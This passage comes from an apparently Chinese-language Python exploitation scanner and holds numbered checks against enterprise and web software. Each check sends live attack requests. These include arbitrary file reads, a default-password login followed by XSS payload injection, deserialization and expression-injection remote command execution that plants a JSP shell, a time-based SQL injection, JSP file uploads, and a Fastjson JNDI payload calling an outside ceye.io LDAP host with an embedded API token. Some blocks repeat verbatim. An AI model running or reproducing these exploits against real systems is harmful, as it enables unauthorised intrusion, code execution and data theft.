            url = 'http://' + url

        encodetext = url + path
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36",
            "Accept": "*/*",
            "Accept-Language": "en",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close"
        }

        try:
            req = requests.get(encodetext, headers=headers, timeout=5, proxies=proxies)
            res = req.text

            if req.status_code == 200 and ';' in res:
                append_to_output(f"[+] {url} 存在艾科思应用接入系统存在任意文件读取漏洞！！！！", "red")
                append_to_output(res, "yellow")
                with open("output.txt", "a") as file:
                    file.write(f"[+] {url} 存在艾科思应用接入系统存在任意文件读取漏洞！！！！" + "\n")
                    file.write(res + "\n")
            else:
                append_to_output(f"[-] {url} 不存在艾科思应用接入系统存在任意文件读取漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "38.SCM Manager XSS漏洞(CVE-2023-33829)":
        if url.endswith("/"):
            path = "scm"
        else:
            path = "/scm"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        main_url = url + path
        auth_url = main_url + "/api/rest/authentication/login.json"
        users = main_url + "/api/rest/users.json"
        groups = main_url + "/api/rest/groups.json"
        repos = main_url + "/api/rest/repositories.json"

        headers = {
            "Content-Type": "multipart/form-data; boundary=A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0"
        }
        session = requests.Session()
        post_data = {
            'username': 'scmadmin',
            'password': 'scmadmin'
        }

        try:

            # urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            req = requests.post(auth_url, headers=headers, data=post_data, verify=False, timeout=10,
                                proxies=proxies)
            res = req.text
            if req.status_code == 200:
                append_to_output(f"[+] {url} 登录成功，存在SCM Manager默认密码！！！！", "red")

                with open("output.txt", "a") as file:
                    file.write(f"[+] {url} 登录成功，存在SCM Manager默认密码！！！！" + "\n")
                    file.write(res + "\n")
                new_user = {

                    "name": "newUser",
                    "displayName": "<img src=x onerror=alert('XSS')>",
                    "mail": "",
                    "password": "",
                    "admin": False,
                    "active": True,
                    "type": "xml"

                }
                create_user = session.post(users, json=new_user)
                append_to_output("[+] 用XSS代码完成create_user创建，请用浏览器请求URL进行验证", "yellow")

                new_group = {

                    "name": "newGroup",
                    "description": "<img src=x onerror=alert('XSS')>",
                    "type": "xml"

                }

                create_group = session.post(groups, json=new_group)
                append_to_output("[+] 用XSS代码完成create_group创建，请用浏览器请求URL进行验证", "yellow")

                new_repo = {

                    "name": "newRepo",
                    "type": "svn",
                    "contact": "",
                    "description": "<img src=x onerror=alert('XSS')>",
                    "public": False

                }

                create_repo = session.post(repos, json=new_repo)
                append_to_output("[+] 用XSS代码完成new_repo创建，请用浏览器请求URL进行验证", "yellow")
            else:
                append_to_output(f"[-] {url} 登录不成功，不存在SCM Manager默认密码", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "39.金蝶云星空管理中心存在反序列化命令执行":
        if url.endswith("/"):
            path = "Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc"
        else:
            path = "/Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        main_url = url + path

        headers_one = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
            "Accept": "*/*",
            "Content-Type": "text/json",
            "cmd": "ipconfig",
            "Content-Length": "15944",
        }
        headers_two = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
            "Accept": "*/*",
            "Content-Type": "text/json",
            "cmd": "ifconfig",
            "Content-Length": "15944",
        }

        post_data = {
            "ap0": "",
            "format": "3"
        }

        try:

            # urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            req = requests.post(main_url, headers=headers_one, json=post_data, verify=False, timeout=10,
                                proxies=proxies)
            res = req.text
            if req.status_code == 200 and 'Windows IP' in res:
                append_to_output(f"[+] {url} 存在 金蝶云星空管理中心存在反序列化命令执行！！！！", "red")
                append_to_output(res, "yellow")
                with open("output.txt", "a") as file:
                    file.write(f"[+] {url} 存在 金蝶云星空管理中心存在反序列化命令执行！！！！" + "\n")
                    file.write(res + "\n")
            else:
                urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
                req = requests.post(main_url, headers=headers_two, json=post_data, verify=False, timeout=10,
                                    proxies=proxies)
                res = req.text
                if req.status_code == 200 and 'flags' in res:
                    append_to_output(f"[+] {url} 存在 金蝶云星空管理中心存在反序列化命令执行！！！！", "red")
                    append_to_output(res, "yellow")
                    with open("output.txt", "a") as file:
                        file.write(f"[+] {url} 存在 金蝶云星空管理中心存在反序列化命令执行！！！！" + "\n")
                        file.write(res + "\n")
                else:
                    append_to_output(f"[-] {url} 不存在 金蝶云星空管理中心存在反序列化命令执行", "green")
                # append_to_output(f"[-] {url} 不存在 金蝶云星空管理中心存在反序列化命令执行", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "40.Gibbon CVE-2023-34598":
        if url.endswith("/"):
            path = '?q=./gibbon.sql'
        else:
            path = '/?q=./gibbon.sql'

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36",
            "Accept": "*/*",
            "Accept-Language": "en",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close"
        }

        try:
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            req = requests.get(encodetext, headers=headers, verify=False, timeout=20, proxies=proxies)
            res = req.text

            if 'sql' in res:
                append_to_output(f"[+] {url} 存在Gibbon CVE-2023-34598漏洞！！！！", "red")
                append_to_output(res, "yellow")
                with open("output.txt", "a") as file:
                    file.write(f"[+] {url} 存在Gibbon CVE-2023-34598漏洞！！！！" + "\n")
                    file.write(res + "\n")
            else:
                append_to_output(f"[-] {url} 不存在Gibbon CVE-2023-34598漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "41.泛微E-Cology SQL注入漏洞复现(QVD-2023-15672)":
        if url.endswith("/"):
            path = "weaver/weaver.file.FileDownloadForOutDoc/?fileid=123+WAITFOR+DELAY+'0:0:5'&isFromOutImg=1"
        else:
            path = "/weaver/weaver.file.FileDownloadForOutDoc/?fileid=123+WAITFOR+DELAY+'0:0:5'&isFromOutImg=1"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path

        try:
            req = requests.get(encodetext, headers=headers, timeout=5, proxies=proxies)
            res = req.text

            if req.status_code == 200:
                append_to_output(f"[+] {url} 存在泛微E-Cology SQL注入漏洞复现(QVD-2023-15672)！！！！", "red")
                append_to_output(res, "yellow")
            else:
                append_to_output(f"[-] {url} 不存在泛微E-Cology SQL注入漏洞复现(QVD-2023-15672)", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "42.用友NC Cloud存在前台远程命令执行漏洞":

        headers_NC = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
            "Accept-Encoding": "gzip, deflate",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Connection": "close",
            "Host": "127.0.0.1",
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Cookie": "cookiets=1681785470496; JSESSIONID=33989F450B1EA57D4D3ED07A343770FF.server",
            "If-None-Match": 'W/"1571-1589211696000"',
            "If-Modified-Since": "Mon, 11 May 2020 15:41:36 GMT",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        if url.endswith("/"):
            path = "uapjs/jsinvoke/?action=invoke"
        else:
            path = "/uapjs/jsinvoke/?action=invoke"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path

        payload = {
            "serviceName": "nc.itf.iufo.IBaseSPService",
            "methodName": "saveXStreamConfig",
            "parameterTypes": ["java.lang.Object", "java.lang.String"],
            "parameters": ["${param.getClass().forName(param.error).newInstance().eval(param.cmd)}",
                           "webapps/nc_web/823780482.jsp"]
        }
        data = json.dumps(payload)

        try:
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            req = requests.post(encodetext, headers=headers, data=data, verify=False, timeout=10, proxies=proxies)
            res = req.text

            if req.status_code == 200:
                command = 'org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("ipconfig").getInputStream())'
                payload = {
                    "cmd": command
                }
                if url.endswith("/"):
                    path = "823780482.jsp?error=bsh.Interpreter"
                else:
                    path = "/823780482.jsp?error=bsh.Interpreter"

                if not url.startswith('http://') and not url.startswith('https://'):
                    url = 'http://' + url
                againurl = url + path
                urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
                reql = requests.post(againurl, headers=headers_NC, data=payload, verify=False, timeout=10,
                                     proxies=proxies)
                resl = reql.text
                if reql.status_code == 200:
                    append_to_output(f"[+] {url} 存在用友NC Cloud存在前台远程命令执行漏洞！！！！", "red")
                    append_to_output(resl, "yellow")
            else:
                append_to_output(f"[-] {url} 不存在用友NC Cloud存在前台远程命令执行漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "43.HIKVISION-海康威视综合安防管理平台远程命令执行漏洞(Fastjson)":
        # 替换成您的CEYE API信息
        api_base_url = "http://api.ceye.io/v1"
        api_token = "394eb5e86394352a6270dc6a60dc7848"
        payload_id = "0uim95.ceye.io"

        # 构建API请求的参数
        params = {
            "token": api_token,
            "type": "dns",
            "filter": payload_id
        }

        # 构建API请求的URL
        request_url = f"{api_base_url}/records"

        if url.endswith("/"):
            path = "ebic/ssoService/v1/applyCT"
        else:
            path = "/bic/ssoService/v1/applyCT"
        encodetext = url + path

        payload = {
            "a": {
                "@type": "java.lang.Class",
                "val": "com.sun.rowset.JdbcRowSetImpl"
            },
            "b": {
                "@type": "com.sun.rowset.JdbcRowSetImpl",
                "dataSourceName": "ldap://0uim95.ceye.io",
                "autoCommit": True
            },
            "hfe4zyyzldp": "="
        }
        headers = {
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-User": "?1",
            "Te": "trailers",
            "Content-Type": "application/json"
        }

        try:
            response_ceye = requests.get(request_url, params=params, verify=False, proxies=None)
            if response_ceye.status_code == 200:
                data = response_ceye.json()
                records = data.get("data", [])
                id_count = len(records)

                if id_count > 0:
                    append_to_output(f"[-] CEYE收到请求记录，共收到 {id_count} 个id属性记录。", "yellow")
                    append_to_output("[!] 请求记录列表：", "yellow")
                    for record in records:
                        append_to_output(str(record), "yellow")
                else:
                    append_to_output("[-] CEYE没有收到请求记录。", "yellow")

            else:
                append_to_output("[-] API请求失败。HTTP状态码：", response_ceye.status_code)

            response = requests.post(encodetext, headers=headers, json=payload, verify=False, timeout=10,
                                     proxies=proxies)
            res = response.text
            if 'code' in res:
                append_to_output(
                    Fore.GREEN + f"[+] {url} 可能存在海康威视综合安防管理平台远程命令执行漏洞(Fastjson)，等待ceyelog日志确认！！！！",
                    "red")
                append_to_output(res, "yellow")

                response_ceye = requests.get(request_url, params=params, verify=False, timeout=10, proxies=proxies)
                if response_ceye.status_code == 200:
                    data = response_ceye.json()
                    records = data.get("data", [])
                    id_count_change = len(records)

                    if id_count_change > id_count:
                        append_to_output(
                            f"[!] CEYE收到请求记录，共收到 {id_count_change} 个id属性记录。99%确认存在漏洞", "red")
                        append_to_output("请求记录列表：", "yellow")
                        for record in records:
                            append_to_output(str(record), "yellow")
                    else:
                        append_to_output(f"[-] CEYE没有收到请求记录，误报。", "green")

                else:
                    append_to_output(f"[-] API请求失败。HTTP状态码：{response_ceye.status_code}", "green")
            else:
                append_to_output(Fore.RED + f"[-] {url} 不存在海康威视综合安防管理平台远程命令执行漏洞(Fastjson)",
                                 "green")
        except Timeout:
            append_to_output(f"[!] 请求超时，但是检测一下ceye是否有变化: {url}", "yellow")
            response_ceye = requests.get(request_url, params=params, verify=False, timeout=10, proxies=proxies)
            if response_ceye.status_code == 200:
                data = response_ceye.json()
                records = data.get("data", [])
                id_count_change = len(records)

                if id_count_change > id_count:
                    append_to_output(f"[!] CEYE收到请求记录，共收到 {id_count_change} 个id属性记录。99%确认存在漏洞",
                                     "red")
                    append_to_output("[-] 请求记录列表：", "yellow")
                    for record in records:
                        append_to_output(str(record), "yellow")
                    append_to_output(f"[+] 确认 {url} 存在海康威视综合安防管理平台远程命令执行漏洞(Fastjson)",
                                     "red")
                else:
                    append_to_output("[-] CEYE没有收到请求记录，跳过这个URL。", "green")

            else:
                append_to_output(f"[-] API请求失败。HTTP状态码：{response_ceye.status_code}", "green")
        except Exception as e:
            append_to_output(str(e))
    if vulnerability == "42.用友NC Cloud存在前台远程命令执行漏洞":
        proxies = {
            'http': 'http://127.0.0.1:8080',
            'https': 'http://127.0.0.1:8080'
        }
        headers_NC = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
            "Accept-Encoding": "gzip, deflate",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Connection": "close",
            "Host": "127.0.0.1",
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Cookie": "cookiets=1681785470496; JSESSIONID=33989F450B1EA57D4D3ED07A343770FF.server",
            "If-None-Match": 'W/"1571-1589211696000"',
            "If-Modified-Since": "Mon, 11 May 2020 15:41:36 GMT",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        if url.endswith("/"):
            path = "uapjs/jsinvoke/?action=invoke"
        else:
            path = "/uapjs/jsinvoke/?action=invoke"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path

        payload = {
            "serviceName": "nc.itf.iufo.IBaseSPService",
            "methodName": "saveXStreamConfig",
            "parameterTypes": ["java.lang.Object", "java.lang.String"],
            "parameters": ["${param.getClass().forName(param.error).newInstance().eval(param.cmd)}",
                           "webapps/nc_web/823780482.jsp"]
        }
        data = json.dumps(payload)
        try:
            req = requests.post(encodetext, headers=headers, data=data, verify=False, timeout=10, proxies=proxies)
            res = req.text

            if req.status_code == 200:
                command = 'org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("ipconfig").getInputStream())'
                payload = {
                    "cmd": command
                }
                if url.endswith("/"):
                    path = "823780482.jsp?error=bsh.Interpreter"
                else:
                    path = "/823780482.jsp?error=bsh.Interpreter"

                if not url.startswith('http://') and not url.startswith('https://'):
                    url = 'http://' + url
                againurl = url + path
                reql = requests.post(againurl, headers=headers_NC, data=payload, verify=False, timeout=10,
                                     proxies=proxies)
                resl = reql.text
                if reql.status_code == 200:
                    append_to_output(f"[+] {url} 存在用友NC Cloud存在前台远程命令执行漏洞！！！！", "red")
                    append_to_output(resl, "yellow")
            else:
                append_to_output(f"[-] {url} 不存在用友NC Cloud存在前台远程命令执行漏洞", "green")
        except Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except Exception as e:
            append_to_output(str(e))
    if vulnerability == "43.HIKVISION-海康威视综合安防管理平台远程命令执行漏洞(Fastjson)":
        # 替换成您的CEYE API信息
        api_base_url = "http://api.ceye.io/v1"
        api_token = "394eb5e86394352a6270dc6a60dc7848"
        payload_id = "0uim95.ceye.io"

        # 构建API请求的参数
        params = {
            "token": api_token,
            "type": "dns",
            "filter": payload_id
        }

        # 构建API请求的URL
        request_url = f"{api_base_url}/records"

        if url.endswith("/"):
            path = "ebic/ssoService/v1/applyCT"
        else:
            path = "/bic/ssoService/v1/applyCT"
        encodetext = url + path

        payload = {
            "a": {
                "@type": "java.lang.Class",
                "val": "com.sun.rowset.JdbcRowSetImpl"
            },
            "b": {
                "@type": "com.sun.rowset.JdbcRowSetImpl",
                "dataSourceName": "ldap://0uim95.ceye.io",
                "autoCommit": True
            },
            "hfe4zyyzldp": "="
        }
        headers = {
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-User": "?1",
            "Te": "trailers",
            "Content-Type": "application/json"
        }
        append_to_output("===================================================================", "green")
        try:
            response_ceye = requests.get(request_url, params=params, verify=False, proxies=None)
            if response_ceye.status_code == 200:
                data = response_ceye.json()
                records = data.get("data", [])
                id_count = len(records)

                if id_count > 0:
                    append_to_output(f"[-] CEYE收到请求记录，共收到 {id_count} 个id属性记录。", "yellow")
                    append_to_output("[!] 请求记录列表：", "yellow")
                    for record in records:
                        append_to_output(str(record), "yellow")
                else:
                    append_to_output("[-] CEYE没有收到请求记录。", "yellow")

            else:
                append_to_output("[-] API请求失败。HTTP状态码：", response_ceye.status_code)

            response = requests.post(encodetext, headers=headers, json=payload, verify=False, timeout=10,
                                     proxies=proxies)
            res = response.text
            if 'code' in res:
                append_to_output(
                    Fore.GREEN + f"[+] {url} 可能存在海康威视综合安防管理平台远程命令执行漏洞(Fastjson)，等待ceyelog日志确认！！！！",
                    "red")
                append_to_output(res, "yellow")

                response_ceye = requests.get(request_url, params=params, verify=False, timeout=10, proxies=proxies)
                if response_ceye.status_code == 200:
                    data = response_ceye.json()
                    records = data.get("data", [])
                    id_count_change = len(records)

                    if id_count_change > id_count:
                        append_to_output(
                            f"[!] CEYE收到请求记录，共收到 {id_count_change} 个id属性记录。99%确认存在漏洞", "red")
                        append_to_output("请求记录列表：", "yellow")
                        for record in records:
                            append_to_output(str(record), "yellow")
                    else:
                        append_to_output(f"[-] CEYE没有收到请求记录，误报。", "green")

                else:
                    append_to_output(f"[-] API请求失败。HTTP状态码：{response_ceye.status_code}", "green")
            else:
                append_to_output(Fore.RED + f"[-] {url} 不存在海康威视综合安防管理平台远程命令执行漏洞(Fastjson)",
                                 "green")
        except Timeout:
            append_to_output(f"[!] 请求超时，但是检测一下ceye是否有变化: {url}", "yellow")
            response_ceye = requests.get(request_url, params=params, verify=False, timeout=10, proxies=proxies)
            if response_ceye.status_code == 200:
                data = response_ceye.json()
                records = data.get("data", [])
                id_count_change = len(records)

                if id_count_change > id_count:
                    append_to_output(f"[!] CEYE收到请求记录，共收到 {id_count_change} 个id属性记录。99%确认存在漏洞",
                                     "red")
                    append_to_output("[-] 请求记录列表：", "yellow")
                    for record in records:
                        append_to_output(str(record), "yellow")
                    append_to_output(f"[+] 确认 {url} 存在海康威视综合安防管理平台远程命令执行漏洞(Fastjson)",
                                     "red")
                else:
                    append_to_output("[-] CEYE没有收到请求记录，跳过这个URL。", "green")

            else:
                append_to_output(f"[-] API请求失败。HTTP状态码：{response_ceye.status_code}", "green")
        except Exception as e:
            append_to_output(str(e))
    if vulnerability == "44.宏景eHR 任意文件上传漏洞":
        if url.endswith("/"):
            path = "w_selfservice/oauthservlet/"
        else:
            path = "/w_selfservice/oauthservlet/"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        base_url = url + path
        relative_path = "../../system/options/customreport/OfficeServer.jsp"
        full_url = base_url + relative_path

        headers = {
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close"
        }
        data = "DBSTEP V3.0     351             0               666             DBSTEP=REJTVEVQ\nOPTION=U0FWRUZJTEU=\ncurrentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\nFILETYPE=Li5cNjYuanNw\nRECOR1DID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\noriginalFileId=wV66\noriginalCreateDate=wUghPB3szB3Xwg66\nFILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6\nneedReadFile=yRWZdAS6\noriginalCreateDate=wLSGP4oEzLKAz4=iz=66\n\n<%out.println(\"test\");%>"

        append_to_output("===================================================================", "green")
        try:
            # 创建不验证SSL证书的HTTPSHandler
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            https_handler = urllib.request.HTTPSHandler(context=context)
            # 设置Burp代理
            proxy_handler = urllib.request.ProxyHandler(
                {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'})
            # 构建Opener
            opener = urllib.request.build_opener(proxy_handler)
            # 构建请求对象
            request = urllib.request.Request(full_url, data=data.encode('utf-8'), headers=headers)
            # 发送POST请求
            response = opener.open(request)
            result = str(response.read())
            if response.getcode() == 200 and '21' in result or 'DBS' in result:
                append_to_output(f"[+] {url} 存在宏景eHR 任意文件上传漏洞！！！！", "red")
                append_to_output(result, "yellow")
                with open("output.txt", "a") as file:
                    file.write(f"[+] {url} 存在宏景eHR 任意文件上传漏洞！！！！" + "\n")
                    file.write(result + "\n")
            else:
                if url.endswith("/"):
                    path = "66.jsp"
                else:
                    path = "/66.jsp"

                if not url.startswith('http://') and not url.startswith('https://'):
                    url = 'http://' + url

                encodetext = url + path
                req_get = requests.get(encodetext, headers=headers, verify=False, timeout=5, proxies=proxies)
                res_get = req_get.text
                if req_get.status_code == 200:
                    append_to_output(f"[+] 通过直接访问 {url} 发现存在宏景eHR 任意文件上传漏洞！！！！", "red")
                    append_to_output(res, "yellow")
                else:
                    append_to_output(f"[-] {url} 不存在宏景eHR 任意文件上传漏洞", "green")
        except Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except Exception as e:
            append_to_output(str(e), "yellow")
    if vulnerability == "45.用友GRP-U8 存在任意文件上传漏洞":

        if url.endswith("/"):
            path = "UploadFileData?action=upload_file&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&foldername=..%2F&filename=94156577.jsp&filename=1.jpg"
        else:
            path = "/UploadFileData?action=upload_file&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&foldername=..%2F&filename=94156577.jsp&filename=1.jpg"

        if not url.startswith('http://') and not url.startswith('https://'):
            url_new = 'http://' + url
        else:
            url_new = url
        encodetext = url_new + path
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36",
            "Accept-Encoding": "gzip, deflate",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Connection": "keep-alive",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Cookie": "JSESSIONID=59227D2C93FE3E8C2626DA625CE710F9",
        }

        data = '''--ec126a48c5b7676dce1b676f5251358f\r\nContent-Disposition: form-data; name="myfile"; filename="test.jpg"\r\n\r\n<% out.println("3135168535");%>\r\n--ec126a48c5b7676dce1b676f5251358f--'''

        try:

            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            req = requests.post(encodetext, data=data, headers=headers, timeout=5, proxies=proxies)
            res = req.text
            if req.status_code == 200:
                append_to_output(f"[+] {url} 可能存在用友GRP-U8 存在任意文件上传漏洞！！！！", "yellow")

                append_to_output("发送请求包进行漏洞确认", "green")
                if url.endswith("/"):
                    path = "R9iPortal/94156577.jsp"
                else:
                    path = "/R9iPortal/94156577.jsp"

                if not url.startswith('http://') and not url.startswith('https://'):
                    url = 'http://' + url
                else:
                    url_new = url
                end_newpath = url_new + path
                try:
                    newreq = requests.get(end_newpath, timeout=10, verify=False, proxies=proxies)
                    newres = newreq.text
                    if newreq.status_code == 200 and '313516' in newres:
                        append_to_output(f"[+] {end_newpath} 确认无误,存在漏洞！！！！", "red")
                        append_to_output(f"[+] 返回数据为: {newres} ", "red")
                        with open("output.txt", "a") as file:
                            file.write(f"[+] {url} 存在用友GRP-U8 存在任意文件上传漏洞！！！！" + "\n")
                            file.write(res + "\n")
                    else:
                        append_to_output(f"[+] {end_newpath} 可能不存在漏洞！！！！", "green")
                except Timeout:
                    append_to_output(f"[!] 寻找94156577.jsp文件请求超时，跳过URL: {end_newpath}", "yellow")
                except Exception as e:
                    append_to_output(str(e), "yellow")
            else:
                append_to_output(f"[-] {url} 不存在用友GRP-U8 存在任意文件上传漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "46.畅捷通TPlus DownloadProxy.aspx 存在任意文件读取漏洞":

        if url.endswith("/"):
            path = "tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config"
        else:
            path = "/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path

        try:
            req = requests.get(encodetext, headers=headers, timeout=5, proxies=proxies)
            res = req.text

            if req.status_code == 200 and 'configuration' in res:
                append_to_output(f"[+] {url} 存在畅捷通TPlus DownloadProxy.aspx 存在任意文件读取漏洞！！！！", "red")
                append_to_output(res, "yellow")
                with open("output.txt", "a") as file:
                    file.write(f"[+] {url} 存在畅捷通TPlus DownloadProxy.aspx 存在任意文件读取漏洞！！！！" + "\n")
                    file.write(res + "\n")
            else:
                append_to_output(f"[-] {url} 不存在畅捷通TPlus DownloadProxy.aspx 存在任意文件读取漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "47.Metabase RCE漏洞(CVE-2023-38646)":
        # 替换成您的CEYE API信息
        api_base_url = "http://api.ceye.io/v1"
